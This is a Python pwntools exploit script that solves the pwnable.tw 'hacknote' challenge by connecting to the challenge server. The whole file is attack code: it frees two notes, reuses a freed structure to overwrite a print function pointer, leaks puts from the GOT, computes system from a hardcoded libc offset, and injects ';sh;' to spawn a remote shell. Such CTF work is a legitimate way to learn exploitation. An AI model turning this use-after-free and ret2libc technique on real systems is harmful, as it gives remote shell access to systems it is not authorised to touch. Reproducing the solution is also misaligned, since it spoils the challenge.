#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='i386', os='linux')

#p = process('./hacknote')
p = remote('chall.pwnable.tw', 10102)

def addnote(size, note=None):
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil('size :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    if note is not None:
        p.send(note)
    else:
        p.send('K' * size)

def deletenote(index):
    p.recvuntil('choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))

def printnote(index):
    p.recvuntil('choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))
    msg = p.recv(4)
    return msg

addnote(64)
addnote(64)

deletenote(0)
deletenote(1)

dump_func = 0x0804862B
puts_got = 0x0804a024

addnote(8, p32(dump_func) + p32(puts_got))

puts_real = u32(printnote(0))
log.success('puts_real = ' + hex(puts_real))

system_puts_offset = 0x24800
system_real = puts_real - system_puts_offset
log.success('system_real = ' + hex(system_real))

deletenote(2)

addnote(8, p32(system_real) + b';sh;')

p.recvuntil('choice :')
p.sendline('3')
p.recvuntil('Index :')
p.sendline('0')

p.interactive()
